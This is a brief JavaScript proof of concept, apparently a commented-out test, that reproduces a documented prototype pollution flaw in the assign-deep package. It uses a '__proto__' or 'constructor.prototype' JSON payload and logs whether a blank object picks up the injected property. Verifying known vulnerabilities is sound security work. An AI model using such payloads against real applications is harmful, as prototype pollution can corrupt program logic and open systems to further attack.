// //https://snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211
// test("prototype pollution in assign-deep ", () => {
  const assign = require("assign-deep");
  //const payloads = ['{"__proto__": {"polluted": "yes"}}'];
  const payloads = ['{"constructor": {"prototype": {"polluted": "yes"}}}'];
  var obj = {};

console.log({}.polluted);

  assign({}, JSON.parse(payloads[0]));
console.log({}.polluted);
// });
